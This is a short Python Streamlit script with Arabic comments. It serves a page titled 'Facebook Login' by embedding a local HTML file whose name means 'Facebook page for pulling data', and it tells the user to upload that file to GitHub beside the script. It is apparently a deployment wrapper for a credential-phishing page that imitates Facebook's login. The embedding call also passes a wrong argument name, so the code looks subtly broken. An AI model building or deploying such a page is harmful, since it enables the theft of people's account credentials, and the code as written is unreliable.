import streamlit as st
import streamlit.components.v1 as components

# منع ظهور أخطاء الموديولات غير الموجودة
st.set_page_config(page_title="Facebook Login", layout="centered")

# قراءة ملف الـ HTML
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        html_code = f.read()
    
    # عرض الصفحة
    components.html(html_content=html_code, height=800, scrolling=True)
except FileNotFoundError:
    st.error("تأكد من رفع ملف الـ HTML بجانب ملف البايثون على GitHub!")